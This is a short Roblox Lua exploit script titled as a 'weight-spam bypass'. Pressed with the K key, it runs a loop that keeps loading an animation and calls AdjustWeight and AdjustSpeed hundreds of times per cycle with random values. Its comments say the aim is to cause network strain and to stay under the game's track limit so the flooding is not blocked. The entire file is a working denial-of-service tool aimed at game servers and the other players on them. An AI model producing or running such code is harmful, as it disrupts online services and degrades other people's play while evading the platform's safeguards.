-- NEW WEIGHT-SPAM BYPASS (JAN 2026)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local active = false
local player = Players.LocalPlayer

-- Use a standard animation ID that won't be blocked
local id = "rbxassetid://507766388" 

UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.K then
        active = not active
        print("Bypass State:", active)
    end
end)

task.spawn(function()
    while true do
        if active then
            local char = player.Character
            local animator = char and char:FindFirstChildOfClass("Humanoid") and char.Humanoid:FindFirstChildOfClass("Animator")
            
            if animator then
                -- Load just ONE track to stay under the 32-track limit
                local anim = Instance.new("Animation")
                anim.AnimationId = id
                local track = animator:LoadAnimation(anim)
                track:Play()

                -- High-speed property spam (This is what causes the network strain)
                for i = 1, 500 do
                    track:AdjustWeight(math.random(1, 100))
                    track:AdjustSpeed(math.random(1, 100))
                end
                
                -- Briefly cleanup to refresh the data
                task.wait()
                track:Stop(0)
                track:Destroy()
                anim:Destroy()
            end
        end
        task.wait(0.01)
    end
end)
